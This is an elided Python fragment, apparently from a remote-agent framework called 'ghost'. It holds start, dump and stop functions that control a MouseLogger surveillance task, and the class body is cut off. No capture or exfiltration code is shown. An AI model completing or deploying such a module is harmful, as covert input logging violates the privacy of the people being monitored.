...
def mouselogger_start(event_id=None):
    if ghost.agent.manager.active(MouseLogger):
        return False

    try:
        ghost.agent.manager.create(MouseLogger, event_id=event_id)
    except:
        return False
...
def mouselogger_dump():
    mouselogger = ghost.agent.manager.get(MouseLogger)
    if mouselogger:
...
def mouselogger_stop():
    mouselogger = ghost.agent.manager.get(MouseLogger)
    if mouselogger:
        ghost.agent.manager.stop(MouseLogger)
        return mouselogger.results

class MouseLogger(ghost.Task):
